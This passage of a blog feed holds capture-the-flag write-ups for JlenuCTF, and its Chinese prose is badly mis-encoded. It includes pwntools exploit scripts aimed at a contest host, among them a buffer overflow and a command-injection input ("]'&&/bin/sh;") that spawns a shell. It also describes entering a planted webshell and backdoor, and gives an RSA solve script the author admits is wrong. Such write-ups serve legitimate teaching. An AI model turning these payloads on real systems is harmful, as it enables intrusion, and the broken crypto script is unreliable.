class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[&#x27;0x8&#x27;, &#x27;0x9&#x27;, &#x27;0xa&#x27;, &#x27;0xb&#x27;, &#x27;0xc&#x27;, &#x27;0xd&#x27;, &#x27;0xe&#x27;, &#x27;0xf&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x18&#x27;, &#x27;0x19&#x27;, &#x27;0x1a&#x27;, &#x27;0x1b&#x27;, &#x27;0x1c&#x27;, &#x27;0x1d&#x27;, &#x27;0x1e&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x1f&#x27;, &#x27;0x28&#x27;, &#x27;0x29&#x27;, &#x27;0x2a&#x27;, &#x27;0x2b&#x27;, &#x27;0x2c&#x27;, &#x27;0x2d&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x2e&#x27;, &#x27;0x2f&#x27;, &#x27;0x38&#x27;, &#x27;0x39&#x27;, &#x27;0x3a&#x27;, &#x27;0x3b&#x27;, &#x27;0x3c&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x3d&#x27;, &#x27;0x3e&#x27;, &#x27;0x3f&#x27;, &#x27;0x48&#x27;, &#x27;0x49&#x27;, &#x27;0x4a&#x27;, &#x27;0x4b&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x4c&#x27;, &#x27;0x4d&#x27;, &#x27;0x4e&#x27;, &#x27;0x4f&#x27;, &#x27;0x58&#x27;, &#x27;0x59&#x27;, &#x27;0x5a&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x5b&#x27;, &#x27;0x5c&#x27;, &#x27;0x5d&#x27;, &#x27;0x5e&#x27;, &#x27;0x5f&#x27;, &#x27;0x68&#x27;, &#x27;0x69&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x6a&#x27;, &#x27;0x6b&#x27;, &#x27;0x6c&#x27;, &#x27;0x6d&#x27;, &#x27;0x6e&#x27;, &#x27;0x6f&#x27;, &#x27;0x78&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x79&#x27;, &#x27;0x7a&#x27;, &#x27;0x7b&#x27;, &#x27;0x7c&#x27;, &#x27;0x7d&#x27;, &#x27;0x7e&#x27;, &#x27;0x7f&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x88&#x27;, &#x27;0x89&#x27;, &#x27;0x8a&#x27;, &#x27;0x8b&#x27;, &#x27;0x8c&#x27;, &#x27;0x8d&#x27;, &#x27;0x8e&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x8f&#x27;, &#x27;0x98&#x27;, &#x27;0x99&#x27;, &#x27;0x9a&#x27;, &#x27;0x9b&#x27;, &#x27;0x9c&#x27;, &#x27;0x9d&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x9e&#x27;, &#x27;0x9f&#x27;, &#x27;0xa8&#x27;, &#x27;0xa9&#x27;, &#x27;0xaa&#x27;, &#x27;0xab&#x27;, &#x27;0xac&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xad&#x27;, &#x27;0xae&#x27;, &#x27;0xaf&#x27;, &#x27;0xb8&#x27;, &#x27;0xb9&#x27;, &#x27;0xba&#x27;, &#x27;0xbb&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xbc&#x27;, &#x27;0xbd&#x27;, &#x27;0xbe&#x27;, &#x27;0xbf&#x27;, &#x27;0xc8&#x27;, &#x27;0xc9&#x27;, &#x27;0xca&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xcb&#x27;, &#x27;0xcc&#x27;, &#x27;0xcd&#x27;, &#x27;0xce&#x27;, &#x27;0xcf&#x27;, &#x27;0xd8&#x27;, &#x27;0xd9&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xda&#x27;, &#x27;0xdb&#x27;, &#x27;0xdc&#x27;, &#x27;0xdd&#x27;, &#x27;0xde&#x27;, &#x27;0xdf&#x27;, &#x27;0xe8&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xe9&#x27;, &#x27;0xea&#x27;, &#x27;0xeb&#x27;, &#x27;0xec&#x27;, &#x27;0xed&#x27;, &#x27;0xee&#x27;, &#x27;0xef&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xf8&#x27;, &#x27;0xf9&#x27;, &#x27;0xfa&#x27;, &#x27;0xfb&#x27;, &#x27;0xfc&#x27;, &#x27;0xfd&#x27;, &#x27;0xfe&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xff&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMPWN</title>
      <link href="2021/05/30/VMPWN/"/>
      <url>2021/05/30/VMPWN/</url>
      
        <content type="html"><![CDATA[<h2 id="ciscn-2019-qual-virtual"><a href="#ciscn-2019-qual-virtual" class="headerlink" title="ciscn_2019_qual_virtual"></a>ciscn_2019_qual_virtual</h2>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> VMpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JlenuCTF</title>
      <link href="2021/05/23/JlenuCTF/"/>
      <url>2021/05/23/JlenuCTF/</url>
      
        <content type="html"><![CDATA[<p>åæ­£äº¤å®Œwpäº†ï¼Œç´¢æ€§æ°´ä¸ªåšå®¢å§ï¼ˆ</p><h2 id="HAPPYGAME"><a href="#HAPPYGAME" class="headerlink" title="HAPPYGAME"></a>HAPPYGAME</h2><h3 id="SIMPIOT"><a href="#SIMPIOT" class="headerlink" title="SIMPIOT"></a>SIMPIOT</h3><p>åˆ°æ‰‹åç›´æ¥stringsä¸€æ³¢ï¼Œå•Šè¿™</p><p><img src="https://i.loli.net/2021/05/22/KxLRHa4nw7hP8rY.png" alt=""></p><h3 id="ç¤¾å·¥ä¸€ï¼šå¸®æˆ‘æº¯æº"><a href="#ç¤¾å·¥ä¸€ï¼šå¸®æˆ‘æº¯æº" class="headerlink" title="ç¤¾å·¥ä¸€ï¼šå¸®æˆ‘æº¯æº"></a>ç¤¾å·¥ä¸€ï¼šå¸®æˆ‘æº¯æº</h3><p>æˆ‘æ„¿ç§°ä¸ºæœ€å¼ºé¢˜ç›®ï¼Œé›ªå®yyds</p><p>ğŸ‘´ğŸ»ä¸€å¼€å§‹ä¸çŸ¥é“æ€ä¹ˆå›äº‹ï¼Œä¸‹è½½ä¸‹æ¥www.zipæ˜¯è¿™æ ·çš„ï¼Œè«ä¸æ˜¯ğŸ‘´ğŸ»è¢«æ…å±äº†ï¼Œæµªè´¹äº†ğŸ‘´ğŸ»ä¸€ä¸ªåŠå°æ—¶çœ‹æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åè¿˜çœŸç»™ğŸ‘´ğŸ»æŸ¥å‡ºä¸ªå¨èƒæƒ…æŠ¥ipæ¥</p><p><img src="https://i.loli.net/2021/05/22/LHRF74sqPt3TV9D.png" alt=""></p><p><img src="https://i.loli.net/2021/05/22/KNnSZ8rAUVWqfPc.png" alt=""></p><p>åæ¥ğŸ‘´ğŸ»æµ‹äº†ä¸€å †æ— ç”¨åŠŸï¼Œæ‰¾äº†ä¸€äº›æ—¥å¿—å®¡è®¡è„šæœ¬å’Œæ‰‹å†™æ­£åˆ™çš„è„šæœ¬ï¼Œå‘ç°å•¥éƒ½æŸ¥ä¸åˆ°ï¼ŒğŸ‘´ğŸ»å‚»äº†ï¼ŒğŸ‘´ğŸ»å¯»æ€happygameç»™ğŸ‘´ğŸ»æ•´ä¸happyäº†ï¼ŒğŸ‘´ğŸ»å¾ˆæ°”æ„¤ï¼ŒğŸ‘´ğŸ»å»ç¡è§‰äº†</p><p>ğŸ‘´ğŸ»ç¬¬äºŒå¤©è¶Šæƒ³è¶Šæ°”ï¼ŒğŸ‘´ğŸ»å†³å®šå†æ¥åšä¸€åšï¼ŒğŸ‘´ğŸ»é‡æ–°ä¸‹è½½www.zipï¼ŒğŸ‘´ğŸ»å‚»äº†ï¼Œç«Ÿç„¶æ˜¯ç½‘ç«™æºç ï¼Œ****</p><p>å¥½äº†ï¼Œå¼€å§‹å®¡è®¡ï¼Œripsç»™ğŸ‘´ğŸ»æ‰«</p><p><img src="https://i.loli.net/2021/05/23/qvtuL1K3yZToQCB.png" alt=""></p><p>æ‰«å‡ºæ¥æœ¨é©¬äº†ï¼ŒğŸ‘´ğŸ»ç›´æ¥è¿shellï¼Œç„¶åhacked by HSYM</p><h3 id="ç¤¾å·¥äºŒï¼šæ·±å…¥è°ƒæŸ¥"><a href="#ç¤¾å·¥äºŒï¼šæ·±å…¥è°ƒæŸ¥" class="headerlink" title="ç¤¾å·¥äºŒï¼šæ·±å…¥è°ƒæŸ¥"></a>ç¤¾å·¥äºŒï¼šæ·±å…¥è°ƒæŸ¥</h3><p><img src="https://i.loli.net/2021/05/23/2dEKNoIMWHhtbGf.png" style="zoom:50%;" /></p><p>å®¡æ—¥å¿—ï¼Œipåˆ°æ‰‹</p><h3 id="ç¤¾å·¥ä¸‰ï¼šä¿¡æ¯æ”¶é›†"><a href="#ç¤¾å·¥ä¸‰ï¼šä¿¡æ¯æ”¶é›†" class="headerlink" title="ç¤¾å·¥ä¸‰ï¼šä¿¡æ¯æ”¶é›†"></a>ç¤¾å·¥ä¸‰ï¼šä¿¡æ¯æ”¶é›†</h3><p>è®¿é—®å¸¦é»‘å®¢çš„ç½‘ç«™ï¼Œå‘ç°æ‰£æ‰£å·ï¼Œæ‰¾åˆ°ä»–çš„ç”Ÿæ—¥äº†ï¼Œæœ‰hintï¼Œåšå®¢åå°æ˜¯id+ç”Ÿæ—¥</p><p><img src="https://i.loli.net/2021/05/23/JYo1FjGAEbpklhi.png" alt=""></p><p>ç„¶åå°±å¯ä»¥è¿›å¸¦é»‘å®¢çš„åå°äº†</p><h3 id="ç¤¾å·¥å››ï¼šåå‡»é»‘å®¢"><a href="#ç¤¾å·¥å››ï¼šåå‡»é»‘å®¢" class="headerlink" title="ç¤¾å·¥å››ï¼šåå‡»é»‘å®¢"></a>ç¤¾å·¥å››ï¼šåå‡»é»‘å®¢</h3><p>è¿™ä¸ªğŸ‘´ğŸ»æ²¡æœ‰åšå‡ºæ¥ï¼Œä½†æ˜¯ğŸ‘´ğŸ»ä¸çŸ¥é“å“ªé‡Œä¸å¯¹ï¼Œå…ˆè®°å½•ä¸€ä¸‹8</p><p>è¿›äº†åå°ï¼Œç”¨msfè¿æ¥shellä¸å°±è¡Œäº†</p><p>ç„¶åæ‰¾åˆ°äº†è¿™ä¸ªudf.phpï¼Œæœ‰ä¸ä¼šä¿®ç”µè„‘å¸ˆå‚…ç•™ä¸‹çš„åé—¨ï¼Œè¿™ä¸ç›´æ¥æ‹¿æ¥ç”¨ä¸€æ³¢</p><p>ç„¶åå°è¯•æŸ¥çœ‹backupå‘ç°disable_functionç»™banäº†å¥½å¤šsystemä¹‹ç±»çš„ä¸œè¥¿ï¼Œç®—äº†ï¼Œå†çœ‹çœ‹åˆ«çš„ç›®å½•</p><p>ç„¶åå‘ç°äº†è¿™ä¸ª</p><p><img src="https://i.loli.net/2021/05/23/klZN8cqTEMKp2Qg.png" style="zoom:50%;" /></p><p>èŠœæ¹–ï¼Œç„¶åé‚®ç®±å¯†ç å°±æ‹¿åˆ°äº†ï¼Œç”¨å¸¦é»‘å®¢çš„ProtonMailé‚®ç®±ç™»è¿›å»ï¼Œå‘ç°åšæœäº‘2333</p><p><img src="https://i.loli.net/2021/05/23/pxSX9ogACfr5BY1.png" style="zoom:50%;" /></p><p>å‘ç°å¸¦é»‘å®¢çš„èº«ä»½è¯ï¼Œé‚£æŒ‰ç†æ¥è¯´é»‘å®¢å°±ä½åœ¨ä¸‹åŒ—æ³½ï¼Ÿä½†æ˜¯flagä¸å¯¹</p><p><img src="https://i.loli.net/2021/05/23/QXrWPYkZ62uTCNs.png" style="zoom:50%;" /></p><p>æ‰€ä»¥ğŸ‘´ğŸ»ç™¾åº¦ç™¾ç§‘æŸ¥åˆ°äº†ä¸‹åŒ—æ³½çš„å„ç§å«æ³•å’Œä¸‹åŒ—æ³½åœ¨æ—¥æœ¬çš„å…·ä½“ä½ç½®ï¼Œéƒ½ä¸å¯¹ï¼Œç®—äº†ï¼Œä¸åšäº†ï¼Œè¡¥ä½œä¸šå»äº†ï¼ˆx</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="warm-up"><a href="#warm-up" class="headerlink" title="warm-up"></a>warm-up</h3><p>ç›´æ¥åœ¨consoleé‡Œè°ƒç”¨jsä»£ç å³å¯å¼¹å‡ºflag</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="WHATS-HAPPEN"><a href="#WHATS-HAPPEN" class="headerlink" title="WHATS HAPPEN?"></a>WHATS HAPPEN?</h3><p>ç®€å•çš„ç›²æ–‡ï¼Œæ‰¾ä¸ªåœ¨çº¿è§£å¯†çš„ä¸€æŠŠæ¢­å°±å¥½äº†</p><h3 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby_RSA"></a>Baby_RSA</h3><p>è™½ç„¶æ²¡æœ‰åšå‡ºæ¥ï¼Œä½†æ˜¯æ„Ÿè§‰æ€è·¯æ²¡é—®é¢˜ï¼Œå…ˆå¡«ä¸ªå‘ï¼Œä¸çŸ¥é“ä¸­é—´å“ªä¸€æ­¥é”™äº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,gcd</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_prime</span>(<span class="params">bits</span>):</span></span><br><span class="line">  <span class="keyword">return</span> sympy.randprime(<span class="number">2</span>**(bits-<span class="number">1</span>), <span class="number">2</span>**bits)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>(<span class="params">bits</span>):</span></span><br><span class="line">    p = get_random_prime(bits)</span><br><span class="line">    q = get_random_prime(bits)</span><br><span class="line">    r = get_random_prime(bits)</span><br><span class="line">    e = get_random_prime(<span class="number">48</span>)</span><br><span class="line">    <span class="keyword">assert</span> gcd(e,phi)==<span class="number">1</span></span><br><span class="line">    d=invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)//gcd(p-<span class="number">1</span>,(gcd(q-<span class="number">1</span>,r-<span class="number">1</span>))))</span><br><span class="line">    <span class="keyword">return</span> (e,d,p*q*r)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg,e,n</span>):</span></span><br><span class="line">    cipher=<span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;nflag.enc&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">hex</span>(cipher)[<span class="number">2</span>:])</span><br><span class="line">        f.close()</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export_pubkey</span>(<span class="params">n,e</span>):</span></span><br><span class="line">    pubkey = RSA.construct((n,e))</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">r&#x27;npubkey.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(pubkey.export_key())</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">e,d,n=gen_key(<span class="number">256</span>)</span><br><span class="line">export_pubkey(n,e)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;d:&quot;</span>,d)</span><br><span class="line"><span class="comment">#d:6848345389131232097250291554774004483864247462767351912899751705063009304102012225840379809975695209148626539132005837425458215616241927473070938221119168859672496841054510245128799501775634965114887272776082740599056090759932017</span></span><br><span class="line">encrypt(flag,<span class="number">7</span>,n)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…ˆç»™äº†dï¼Œè§£å‡ºæ¥pqï¼Œç„¶ååŠ å¯†çš„æ—¶å€™åˆæŠŠeæ¢æˆäº†7</p><p>ä½†æ˜¯è§£çš„æ—¶å€™è§£ä¸å‡ºæ¥ï¼Œä¸çŸ¥é“å“ªé‡Œé”™äº†ï¼Œorz</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xcd2e55e25e84bd7e050e4e28e0725f2b02442e2d55fcc8053f53811610b7a8e1d3aa2d3f3e3923d3f5ad20e00fbe532b255768d77d9e07fc23bbc6c039d741d9</span></span><br><span class="line">q = <span class="number">0xa170bce7723a072e1cfa7b466916939df85d1b97d29c73d5f3cdd8cf49f8194f</span></span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">c = <span class="number">0x3773fd7f928a0231c0a26e48678984fc36db84f4d63de0cdb36a3101e6e48e140a21b6a6fae834dfaa2670d36444a5f002d28a5d4a9efb6822af43d4d98f4aa9a18139b76527049d2c4419d7ad4ddd9ef65ec7176842aa9ced2f8b14af7bf731</span></span><br><span class="line">s = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = long(gmpy2.invert(e, s))</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">pow</span>(c, e, d))</span><br></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-sender"><a href="#easy-sender" class="headerlink" title="easy_sender"></a>easy_sender</h3><p>ç­¾åˆ°é¢˜ï¼Œret2text</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./easysender&#x27;</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p64(<span class="number">0x080491B6</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="strread"><a href="#strread" class="headerlink" title="strread"></a>strread</h3><p>æœ‰webå†…å‘³äº†ï¼Œå°è¯•ç”¨å•å¼•å·å’Œåˆ†å·é—­åˆï¼Œpayloadæ˜¯è¯•å‡ºæ¥çš„</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./white&#x27;</span></span><br><span class="line">port = <span class="number">10002</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Path to follow:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;]&#x27;&amp;&amp;/bin/sh;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="strlenvsread"><a href="#strlenvsread" class="headerlink" title="strlenvsread"></a>strlenvsread</h3><p><img src="https://i.loli.net/2021/05/22/ZUKae2Nf7WwczAu.png" alt=""></p><p>æ¼æ´ç‚¹åœ¨äºstrlenè¯»å–çš„é•¿åº¦å¯ä»¥è¢«00æˆªæ–­ï¼Œä½†æ˜¯readçš„è¿”å›å€¼ä¸å¯ä»¥ï¼Œæº¢å‡ºå°±å®Œäº‹äº†å—·</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./strlenvsread&#x27;</span></span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Neo, enter your matrix: &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Make your choice: &#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="MEGA-RACE"><a href="#MEGA-RACE" class="headerlink" title="MEGA-RACE"></a>MEGA-RACE</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __fastcall <span class="title">scram</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    flag[i] ^= <span class="number">0x77</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•çš„å¼‚æˆ–ï¼Œå†™ä¸ªè„šæœ¬ç®€å•è§£å¯†å³å¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> pass[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, <span class="number">0x10</span>, <span class="number">0x0C</span>, <span class="number">0x14</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x1B</span>, <span class="number">0x43</span>, <span class="number">0x03</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x0D</span>, </span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x0E</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x28</span>, <span class="number">0x16</span>, <span class="number">0x05</span>, <span class="number">0x44</span>, <span class="number">0x28</span>, <span class="number">0x03</span>, </span><br><span class="line">  <span class="number">0x1F</span>, <span class="number">0x44</span>, <span class="number">0x28</span>, <span class="number">0x30</span>, <span class="number">0x22</span>, <span class="number">0x2E</span>, <span class="number">0x56</span>, <span class="number">0x0A</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="built_in">strlen</span>(pass);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pass[i] = pass[i] ^ <span class="number">0x77</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(pass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-py"><a href="#easy-py" class="headerlink" title="easy_py"></a>easy_py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># while None:</span></span><br><span class="line"><span class="comment">#     Happy = [</span></span><br><span class="line"><span class="comment">#         39,</span></span><br><span class="line"><span class="comment">#         109,</span></span><br><span class="line"><span class="comment">#         8,</span></span><br><span class="line"><span class="comment">#         109,</span></span><br><span class="line"><span class="comment">#         51,</span></span><br><span class="line"><span class="comment">#         70,</span></span><br><span class="line"><span class="comment">#         21,</span></span><br><span class="line"><span class="comment">#         65,</span></span><br><span class="line"><span class="comment">#         11,</span></span><br><span class="line"><span class="comment">#         112,</span></span><br><span class="line"><span class="comment">#         22,</span></span><br><span class="line"><span class="comment">#         111,</span></span><br><span class="line"><span class="comment">#         33,</span></span><br><span class="line"><span class="comment">#         82,</span></span><br><span class="line"><span class="comment">#         93,</span></span><br><span class="line"><span class="comment">#         124,</span></span><br><span class="line"><span class="comment">#         23,</span></span><br><span class="line"><span class="comment">#         72,</span></span><br><span class="line"><span class="comment">#         77,</span></span><br><span class="line"><span class="comment">#         125,</span></span><br><span class="line"><span class="comment">#         115,</span></span><br><span class="line"><span class="comment">#         74,</span></span><br><span class="line"><span class="comment">#         27,</span></span><br><span class="line"><span class="comment">#         98,</span></span><br><span class="line"><span class="comment">#         23,</span></span><br><span class="line"><span class="comment">#         87,</span></span><br><span class="line"><span class="comment">#         0,</span></span><br><span class="line"><span class="comment">#         95,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         115,</span></span><br><span class="line"><span class="comment">#         117,</span></span><br><span class="line"><span class="comment">#         42,</span></span><br><span class="line"><span class="comment">#         122,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         124,</span></span><br><span class="line"><span class="comment">#         103,</span></span><br><span class="line"><span class="comment">#         88]</span></span><br><span class="line"><span class="comment">#     num = 37</span></span><br><span class="line"><span class="comment">#     f = input(&#x27;Please input your flag:&#x27;)</span></span><br><span class="line"><span class="comment">#     if len(f) != 38:</span></span><br><span class="line"><span class="comment">#         print(&#x27;Your input is illegal&#x27;)</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     flag = list(f)</span></span><br><span class="line"><span class="comment">#     j = 0</span></span><br><span class="line"><span class="comment">#     for i in flag:</span></span><br><span class="line"><span class="comment">#         flag[j] = ord(i)</span></span><br><span class="line"><span class="comment">#         j += 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     t1 = threading.Thread(encode_1, (1,), **(&#x27;target&#x27;, &#x27;args&#x27;))</span></span><br><span class="line"><span class="comment">#     t2 = threading.Thread(encode_2, (2,), **(&#x27;target&#x27;, &#x27;args&#x27;))</span></span><br><span class="line"><span class="comment">#     t1.start()</span></span><br><span class="line"><span class="comment">#     time.sleep(0.5)</span></span><br><span class="line"><span class="comment">#     t2.start()</span></span><br><span class="line"><span class="comment">#     t1.join()</span></span><br><span class="line"><span class="comment">#     t2.join()</span></span><br><span class="line"><span class="comment">#     if flag == Happy:</span></span><br><span class="line"><span class="comment">#         print(&#x27;Good job!&#x27;)</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     print(&#x27;No no no!&#x27;)</span></span><br></pre></td></tr></table></figure><p>æ˜¯ä¸ªå¤šçº¿ç¨‹ï¼Œencodeå‡½æ•°æ˜¯ç®€å•çš„å¼‚æˆ–</p><p>ç®€å•å†™ä¸ªè§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    flag = [</span><br><span class="line">        <span 